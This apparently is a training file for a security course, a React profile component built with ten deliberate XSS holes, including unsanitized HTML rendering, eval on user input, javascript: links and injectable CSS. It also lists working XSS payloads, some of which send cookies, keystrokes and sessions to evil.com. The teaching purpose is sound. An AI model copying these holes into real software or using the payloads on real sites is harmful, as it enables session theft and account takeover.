/**
 * XSS Vulnerable React Component
 * ==============================
 * Course: GitHub Copilot for Cybersecurity Specialists
 * Lesson: 01 - Vulnerability Detection
 *
 * WARNING: This component contains intentional XSS vulnerabilities.
 * DO NOT use in production environments.
 *
 * OWASP Category: A03:2021 - Injection (XSS)
 * CWE: CWE-79 (Cross-site Scripting)
 *
 * Copilot Chat Prompt:
 * "Analyze this React component for XSS vulnerabilities. Identify:
 *  1. All uses of dangerouslySetInnerHTML
 *  2. Unsafe DOM manipulation
 *  3. Missing output encoding
 *  4. Data flow from user input to dangerous sinks"
 */

import React, { useState, useEffect, useRef } from 'react';

function UserProfile() {
  const [username, setUsername] = useState('');
  const [bio, setBio] = useState('');
  const [website, setWebsite] = useState('');
  const [comment, setComment] = useState('');
  const [comments, setComments] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const bioRef = useRef(null);

  // ==========================================================================
  // VULNERABILITY 1: dangerouslySetInnerHTML without sanitization
  // ==========================================================================
  //
  // Attack Payload: <img src=x onerror="alert('XSS')">
  // Attack Payload: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
  //
  const renderBio = () => {
    return (
      <div className="bio-section">
        <h3>About Me</h3>
        {/* VULNERABLE: dangerouslySetInnerHTML without DOMPurify */}
        <div dangerouslySetInnerHTML={{ __html: bio }} />
      </div>
    );
  };

  // ==========================================================================
  // VULNERABILITY 2: DOM manipulation with innerHTML
  // ==========================================================================
  //
  // Attack Payload: <svg onload="alert('XSS')">
  //
  useEffect(() => {
    if (bioRef.current && bio) {
      // VULNERABLE: Direct innerHTML assignment
      bioRef.current.innerHTML = bio;
    }
  }, [bio]);

  // ==========================================================================
  // VULNERABILITY 3: Unsafe href with javascript: protocol
  // ==========================================================================
  //
  // Attack Payload: javascript:alert(document.cookie)
  //
  const renderWebsiteLink = () => {
    return (
      <div className="website-link">
        {/* VULNERABLE: href accepts javascript: protocol */}
        <a href={website} target="_blank">
          Visit my website
        </a>
      </div>
    );
  };

  // ==========================================================================
  // VULNERABILITY 4: Stored XSS in comments
  // ==========================================================================
  //
  // Attack: Submit comment with <script>stealCookies()</script>
  // All users viewing comments will execute the script
  //
  const handleAddComment = () => {
    if (comment.trim()) {
      // VULNERABLE: Comment stored and rendered without sanitization
      setComments([...comments, {
        id: Date.now(),
        text: comment,
        author: username || 'Anonymous',
        timestamp: new Date().toISOString()
      }]);
      setComment('');
    }
  };

  const renderComments = () => {
    return (
      <div className="comments-section">
        <h3>Comments</h3>
        {comments.map(c => (
          <div key={c.id} className="comment">
            <strong>{c.author}:</strong>
            {/* VULNERABLE: Stored XSS - comment rendered without encoding */}
            <span dangerouslySetInnerHTML={{ __html: c.text }} />
          </div>
        ))}
      </div>
    );
  };

  // ==========================================================================
  // VULNERABILITY 5: DOM-based XSS via URL parameter
  // ==========================================================================
  //
  // Attack URL: ?search=<img src=x onerror=alert('XSS')>
  //
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const searchParam = urlParams.get('search');

    if (searchParam) {
      setSearchQuery(searchParam);
      // VULNERABLE: URL parameter rendered without sanitization
      document.getElementById('search-results').innerHTML =
        `Search results for: ${searchParam}`;
    }
  }, []);

  // ==========================================================================
  // VULNERABILITY 6: Reflected XSS in error messages
  // ==========================================================================
  //
  // Attack: Cause error with payload in input that gets reflected
  //
  const [errorMessage, setErrorMessage] = useState('');

  const handleFormSubmit = () => {
    if (!username) {
      // VULNERABLE: User input reflected in error without encoding
      setErrorMessage(`Username "${username}" is invalid. Please try again.`);
    }
  };

  // ==========================================================================
  // VULNERABILITY 7: eval() with user input (Code Injection)
  // ==========================================================================
  //
  // Attack Payload: "); alert(document.cookie); ("
  //
  const calculateAge = (birthYear) => {
    // VULNERABLE: eval() with user input
    const calculation = `2024 - ${birthYear}`;
    return eval(calculation);
  };

  // ==========================================================================
  // VULNERABILITY 8: Unsafe template literal in document.write
  // ==========================================================================
  //
  const renderDynamicContent = (content) => {
    // VULNERABLE: document.write with user content
    document.write(`<div class="dynamic">${content}</div>`);
  };

  // ==========================================================================
  // VULNERABILITY 9: Event handler injection
  // ==========================================================================
  //
  // Attack: buttonAction = "alert('XSS')"
  //
  const [buttonAction, setButtonAction] = useState('');

  const renderDynamicButton = () => {
    // VULNERABLE: User controls onclick handler
    return (
      <button
        dangerouslySetInnerHTML={{
          __html: `<span onclick="${buttonAction}">Click me</span>`
        }}
      />
    );
  };

  // ==========================================================================
  // VULNERABILITY 10: CSS injection
  // ==========================================================================
  //
  // Attack: backgroundColor = "red; background-image: url('http://evil.com/steal?data='+document.cookie)"
  //
  const [backgroundColor, setBackgroundColor] = useState('#ffffff');

  const containerStyle = {
    // VULNERABLE: User-controlled CSS property
    background: backgroundColor,
    padding: '20px',
    borderRadius: '8px'
  };

  return (
    <div style={containerStyle} className="user-profile">
      <h1>User Profile</h1>

      {/* Error message display - VULNERABLE */}
      {errorMessage && (
        <div
          className="error"
          dangerouslySetInnerHTML={{ __html: errorMessage }}
        />
      )}

      {/* Search results - VULNERABLE */}
      <div id="search-results"></div>

      {/* Form inputs */}
      <div className="form-group">
        <label>Username:</label>
        <input
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Enter username"
        />
      </div>

      <div className="form-group">
        <label>Bio (HTML allowed):</label>
        <textarea
          value={bio}
          onChange={(e) => setBio(e.target.value)}
          placeholder="Tell us about yourself... (supports HTML)"
          rows={4}
        />
      </div>

      <div className="form-group">
        <label>Website URL:</label>
        <input
          type="text"
          value={website}
          onChange={(e) => setWebsite(e.target.value)}
          placeholder="https://your-website.com"
        />
      </div>

      <div className="form-group">
        <label>Background Color:</label>
        <input
          type="text"
          value={backgroundColor}
          onChange={(e) => setBackgroundColor(e.target.value)}
          placeholder="#ffffff"
        />
      </div>

      <button onClick={handleFormSubmit}>Save Profile</button>

      {/* Bio display areas - both VULNERABLE */}
      {renderBio()}
      <div ref={bioRef} className="bio-mirror"></div>

      {/* Website link - VULNERABLE */}
      {website && renderWebsiteLink()}

      {/* Comments section - VULNERABLE */}
      <div className="add-comment">
        <h3>Add Comment</h3>
        <textarea
          value={comment}
          onChange={(e) => setComment(e.target.value)}
          placeholder="Write a comment..."
        />
        <button onClick={handleAddComment}>Post Comment</button>
      </div>

      {renderComments()}

      {/* Dynamic button - VULNERABLE */}
      <div className="form-group">
        <label>Button Action:</label>
        <input
          type="text"
          value={buttonAction}
          onChange={(e) => setButtonAction(e.target.value)}
          placeholder="Enter action"
        />
        {buttonAction && renderDynamicButton()}
      </div>
    </div>
  );
}

export default UserProfile;

/**
 * XSS Attack Payload Reference
 * ============================
 *
 * Basic Payloads:
 * - <script>alert('XSS')</script>
 * - <img src=x onerror="alert('XSS')">
 * - <svg onload="alert('XSS')">
 * - <body onload="alert('XSS')">
 *
 * Cookie Stealing:
 * - <script>new Image().src="http://evil.com/steal?c="+document.cookie</script>
 * - <img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">
 *
 * Keylogging:
 * - <script>document.onkeypress=function(e){new Image().src="http://evil.com/log?k="+e.key;}</script>
 *
 * Session Hijacking:
 * - <script>document.location="http://evil.com/hijack?session="+document.cookie</script>
 *
 * DOM Manipulation:
 * - <script>document.body.innerHTML='<h1>Defaced!</h1>'</script>
 *
 * Polyglot (works in multiple contexts):
 * - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
 */
